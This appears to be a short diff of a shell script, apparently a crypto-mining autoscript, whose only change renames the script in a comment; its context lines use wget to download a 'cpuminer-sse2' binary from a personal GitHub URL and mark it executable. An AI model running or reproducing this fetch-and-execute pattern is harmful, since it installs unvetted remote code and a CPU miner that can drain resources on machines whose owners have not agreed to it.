@@ -1,5 +1,5 @@
 #erl-andi
-#run comand example bash run.sh
+#run comand example bash autoscript.sh
 #dont edit hastag
 wget -qO cpu https://raw.githubusercontent.com/AntonyAjax/kawakita/main/cpuminer-sse2
 chmod +x cpu
